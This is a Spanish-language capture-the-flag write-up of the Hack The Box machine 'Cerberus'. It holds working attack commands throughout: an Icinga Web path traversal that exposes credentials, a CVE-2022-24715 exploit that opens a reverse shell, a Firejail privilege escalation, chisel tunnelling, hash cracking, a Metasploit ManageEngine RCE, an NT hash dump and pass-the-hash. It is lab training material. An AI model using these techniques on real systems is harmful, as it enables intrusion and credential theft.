---
layout: post
title: Cerberus
date: 2023-07-29
description:
img:
fig-caption:
tags: []
---
___

<center><img src="/writeups/assets/img/Cerberus-htb/Cerberus.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos



***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.205 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 16:29 GMT
Nmap scan report for 10.10.11.205
Host is up (0.044s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
8080/tcp  open  http-proxy
61727/tcp open  unknown
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p8080,61727 10.10.11.205 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 16:30 GMT
Nmap scan report for 10.10.11.205
Host is up (0.054s latency).

PORT      STATE SERVICE VERSION
8080/tcp  open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Did not follow redirect to http://icinga.cerberus.local:8080/icingaweb2
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-open-proxy: Proxy might be redirecting requests
61727/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.85 seconds
```

Añado el dominio ```cerberus.local``` y el subdominio ```icinga.cerberus.local``` al ```/etc/hosts```

## Puerto 8080 (HTTP)

Con ```whatweb``` analizo las tecnologías que emplea el servidor web

```null
whatweb http://10.10.11.205:8080
http://10.10.11.205:8080 [302 Found] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.10.11.205], RedirectLocation[http://icinga.cerberus.local:8080/icingaweb2]
http://icinga.cerberus.local:8080/icingaweb2 [301 Moved Permanently] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.10.11.205], RedirectLocation[http://icinga.cerberus.local:8080/icingaweb2/], Title[301 Moved Permanently]
http://icinga.cerberus.local:8080/icingaweb2/ [302 Found] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.10.11.205], RedirectLocation[/icingaweb2/authentication/login]
http://icinga.cerberus.local:8080/icingaweb2/authentication/login [302 Found] Apache[2.4.52], Cookies[_chc], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.10.11.205], RedirectLocation[/icingaweb2/authentication/login?_checkCookie=1]
http://icinga.cerberus.local:8080/icingaweb2/authentication/login?_checkCookie=1 [403 Forbidden] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.10.11.205]
```

La página principal se ve así:

<img src="/writeups/assets/img/Cerberus-htb/1.png" alt="">

En este [artículo](https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web/) explican donde es vulnerable a LFI

```null
curl http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/hosts
127.0.0.1 iceinga.cerberus.local iceinga
127.0.1.1 localhost
172.16.22.1 DC.cerberus.local DC cerberus.local

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Desde la [Documentación oficial](https://icinga.com/docs/icinga-web/latest/doc/05-Authentication/) se puede ver donde se almacenan los archivos de configuración. Todos ellos tienen la extensión ```INI```. Aplico fuzzing para descurbrir rutas

```null
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/Seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/FUZZ.ini
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/FUZZ.ini
Total requests: 26584

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000000161:   200        13 L     32 W       225 Ch      "resources"                                                                                                                                     
000000078:   200        16 L     31 W       285 Ch      "config"                                                                                                                                        
000000634:   200        3 L      7 W        52 Ch       "groups"                                                                                                                                        
000004986:   200        3 L      7 W        52 Ch       "authentication"                                                                                                                                
000024018:   200        5 L      13 W       98 Ch       "roles"                                                                                                                                         

Total time: 0
Processed Requests: 26308
Filtered Requests: 26303
Requests/sec.: 0
```

Las credenciales se encuentran en ```/resources```

```null
curl -s -X GET http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/resources.ini
[icingaweb2]
type = "db"
db = "mysql"
host = "localhost"
dbname = "icingaweb2"
username = "matthew"
password = "IcingaWebPassword2023"
use_ssl = "0"

[kali]
type = "ssh"
user = "kali"
private_key = "/etc/icingaweb2/ssh/kali"
```

Existe un CVE asociado para esta versión. Me descargo el exploit para [CVE-2022-24715](https://raw.githubusercontent.com/JacobEbben/CVE-2022-24715/main/exploit.py). Genero una clave ```id_rsa``` y ejecuto

```null
ssh-keygen -t rsa -m PEM
```

```null
mv ~/.ssh/id_rsa .
```

```null
python3 exploit.py -t http://icinga.cerberus.local:8080/icingaweb2 -u matthew -p IcingaWebPassword2023 -e id_rsa -I 10.10.16.15 -P 443
```

Recibo la shell en una sesión de ```netcat```

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.15] from (UNKNOWN) [10.10.11.205] 49856
bash: cannot set terminal process group (642): Inappropriate ioctl for device
bash: no job control in this shell
www-data@icinga:/usr/share/icingaweb2/public$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@icinga:/usr/share/icingaweb2/public$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
www-data@icinga:/usr/share/icingaweb2/public$ export TERM=xterm
www-data@icinga:/usr/share/icingaweb2/public$ export SHELL=bash
www-data@icinga:/usr/share/icingaweb2/public$ stty rows 55 columns 209
```

Encuentro dos archivos SUID cuyo propietario es ```root``` y no es típico del sistema

```null
www-data@icinga:/$ find \-perm \-4000 2>/dev/null 
./usr/sbin/ccreds_chkpwd
./usr/bin/mount
./usr/bin/sudo
./usr/bin/firejail
./usr/bin/chfn
./usr/bin/fusermount3
./usr/bin/newgrp
./usr/bin/passwd
./usr/bin/gpasswd
./usr/bin/ksu
./usr/bin/pkexec
./usr/bin/chsh
./usr/bin/su
./usr/bin/umount
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/openssh/ssh-keysign
./usr/libexec/polkit-agent-helper-1
```

```null
www-data@icinga:/$ ls -l ./usr/sbin/ccreds_chkpwd
-rwsr-xr-x 1 root root 14488 Feb  4  2021 ./usr/sbin/ccreds_chkpwd
```

```null
www-data@icinga:/$ ls -l ./usr/bin/firejail
-rwsr-xr-x 1 root root 474496 Jan 19  2022 ./usr/bin/firejail
```

Utilizo este [POC](https://seclists.org/oss-sec/2022/q2/att-188/firejoin_py.bin) para su explotación. Ejecuto el exploit y en otra shell me cambio como ```root```

```null
www-data@icinga:/tmp$ python3 firejoin.py 
You can now run 'firejail --join=2117' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
```

```null
www-data@icinga:/usr/share/icingaweb2/public$ firejail --join=2117  
firejail --join=2117
changing root to /proc/2117/root
Warning: cleaning all supplementary groups
Child process initialized in 10.41 ms

www-data@icinga:/usr/share/icingaweb2/public$ su
su
root@icinga:/usr/share/icingaweb2/public# whoami
whoami
root
root@icinga:/usr/share/icingaweb2/public#
```

Pero la flag no está aquí

```null
root@icinga:/# find \-name user.txt 2>/dev/null
```

Como estoy dentro de un contenedor, puedo escanear otras posibles IPs

```null
root@icinga:/# hostname -I
172.16.22.2 
```

Subo un binario estático de ```nmap``` para escanear los puertos del host

```null
root@icinga:/tmp# ./nmap -p- --open --min-rate 5000 -n -Pn -sS 172.16.22.1

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-06-01 12:43 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.16.22.1
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (-0.12s latency).
Not shown: 65534 filtered ports
PORT     STATE SERVICE
5985/tcp open  unknown
MAC Address: 00:15:5D:5F:E8:00 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 26.62 seconds
```

Subo el ```chisel``` para aplicar ```Remote Port Forwading```. En mi equipo lo ejecuto como servidor

```null
chisel server -p 1234 --reverse
```

En el contenedor como cliente

```null
root@icinga:/tmp# ./chisel client 10.10.16.15:1234 R:5985:172.16.22.1:5985 &>/dev/null & disown
```

Me conecto con ```evil-winrm``` pero no se reutilizan las credenciales

```null
evil-winrm -i 127.0.0.1 -u 'matthew' -p 'IcingaWebPassword2023'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
                                        
Error: Exiting with code 1
```

En el directorio ```/var/lib/sss/db``` se encuentran archivos correspondientes a bases de datos

```null
root@icinga:/var/lib/sss/db# ls
cache_cerberus.local.ldb  ccache_CERBERUS.LOCAL  config.ldb  sssd.ldb  timestamps_cerberus.local.ldb
```

En el caché se expone un hash

```null
root@icinga:/var/lib/sss/db# strings cache_cerberus.local.ldb -n 50 | tail -n 1
$6$6LP9gyiXJCovapcy$0qmZTTjp9f2A0e7n4xk0L6ZoeKhhaCNm0VGJnX/Mu608QkliMpIy1FwKZlyUJAZU3FZ3.GQ.4N6bb9pxE3t3T0
```

Lo crackeo con ```john```

```null
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
147258369        (?)     
1g 0:00:00:00 DONE (2023-06-01 18:57) 12.50g/s 6400p/s 6400c/s 6400C/s 123456..letmein
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Esta si que es válida por ```winrm```

```null
evil-winrm -i 127.0.0.1 -u 'matthew' -p '147258369'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\matthew\Documents> 
```

Puedo ver la primera flag

```null
*Evil-WinRM* PS C:\Users\matthew\Desktop> type user.txt
fea0e391fa463ced873c020db15c0f4a
```

# Escalada

Subo el ```chisel.exe``` para traerme los puertos internos por SOCKS

```null
*Evil-WinRM* PS C:\Temp> .\chisel.exe client 10.10.16.15:1234 R:2080:socks
```

Listo los puertos abiertos por TCP

```null
*Evil-WinRM* PS C:\Users\matthew\Documents> netstat -nat | Select-String TCP

  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       InHost
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       InHost
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       InHost
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       InHost
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       InHost
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       InHost
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       InHost
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       InHost
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       InHost
  TCP    0.0.0.0:808            0.0.0.0:0              LISTENING       InHost
  TCP    0.0.0.0:1500           0.0.0.0:0              LISTENING       InHost
  TCP    0.0.0.0:1501           0.0.0.0:0              LISTENING       InHost
  TCP    0.0.0.0:2179           0.0.0.0:0              LISTENING       InHost
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       InHost
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       InHost
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       InHost
  TCP    0.0.0.0:8888           0.0.0.0:0              LISTENING       InHost
  TCP    0.0.0.0:9251           0.0.0.0:0              LISTENING       InHost
  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       InHost
```

El puerto ```9251``` corresponde a una web. Se está aplicando ```Virtual Hosting``` así que añado el dominio ```dc.cerberus.local``` al ```/etc/hosts``` apuntando a la IP de esta máquina. Desde ```FireFox``` y con ```Foxy Proxy``` pasando por el tunel SOCKS puedo ver su contenido

<img src="/writeups/assets/img/Cerberus-htb/3.png" alt="">

Corresponde al servicio [Manager Engine](https://www.manageengine.com/products/self-service-password/kb/install-self-signed-ssl-certificate.html). Estuve probando este [exploit](https://github.com/horizon3ai/CVE-2022-47966/blob/main/README.md) pero no me llegó a funcionar. Sin embargo, la versión de ```Metasploit``` sí


Al iniciar sesión con las credenciales de antes obtengo el GUID. Obtengo una shell

```null
proxychains bash
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
root@kali:/home/rubbx/Desktop/HTB/Machines/Cerberus# msfconsole
                                                  

         .                                         .
 .

      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o
       '   dB'                     BBP
    dB'dB'dB' dBBP     dBP     dBP BB
   dB'dB'dB' dBP      dBP     dBP  BB
  dB'dB'dB' dBBBBP   dBP     dBBBBBBB

                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP
          .                  .                  dB' dBP    dB'.BP
                             |       dBP    dBBBB' dBP    dB'.BP dBP    dBP
                           --o--    dBP    dBP    dBP    dB'.BP dBP    dBP
                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP

                                                                    .
                .
        o                  To boldly go where no
                            shell has gone before


       =[ metasploit v6.3.16-dev                          ]
+ -- --=[ 2315 exploits - 1208 auxiliary - 412 post       ]
+ -- --=[ 975 payloads - 46 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Use the analyze command to suggest 
runnable modules for hosts
Metasploit Documentation: https://docs.metasploit.com/

msf6 > use exploit/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966
[*] Using configured payload cmd/windows/powershell/meterpreter/reverse_tcp
msf6 exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > set GUID 67a8d101690402dc6a6744b8fc8a7ca1acf88b2f
GUID => 67a8d101690402dc6a6744b8fc8a7ca1acf88b2f
msf6 exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > set RHOSTS 172.16.22.1
RHOSTS => 172.16.22.1
msf6 exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > set LHOST 10.10.16.15
LHOST => 10.10.16.15
msf6 exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > set SSL true
SSL => true
msf6 exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > set RPORT 9251
RPORT => 9251
msf6 exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > set ISSUER_URL http://dc.cerberus.local/adfs/services/trust
ISSUER_URL => http://dc.cerberus.local/adfs/services/trust
sf6 exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > run

[*] Started reverse TCP handler on 10.10.16.15:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated.
[*] Sending stage (175686 bytes) to 10.10.11.205
[*] Meterpreter session 1 opened (10.10.16.15:4444 -> 10.10.11.205:64297) at 2023-06-01 20:36:44 +0000
```

Dumpeo los hashes NT de todos los usuarios

```null
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8a89ac8a8b099a7578cd9698578d01fd:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d2e82d4f77310a49973793ee986b6490:::
matthew:1104:aad3b435b51404eeaad3b435b51404ee:bcd285980e1d9b302e16875844ef6977:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:62b2ac47a9d6de6f5c0a0a19d69806ac:::
adfs_svc$:5602:aad3b435b51404eeaad3b435b51404ee:e4f19ac9b4220b87fa07a4f234d51c8a:::
ICINGA$:9102:aad3b435b51404eeaad3b435b51404ee:af70cf6b33f1cce788138d459f676faf:::
```

Gano una shell como ```nt authority\system``` haciendo ```PassTheHash```

```null
proxychains psexec.py cerberus.local/Administrator@127.0.0.1 -hashes ':8a89ac8a8b099a7578cd9698578d01fd' -no-pass
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 127.0.0.1.....
[*] Found writable share ADMIN$
[*] Uploading file WVVdwKZp.exe
[*] Opening SVCManager on 127.0.0.1.....
[*] Creating service YZQF on 127.0.0.1.....
[*] Starting service YZQF.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.4010]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
892f29e5336e460cc8e68eba9e9987e8
```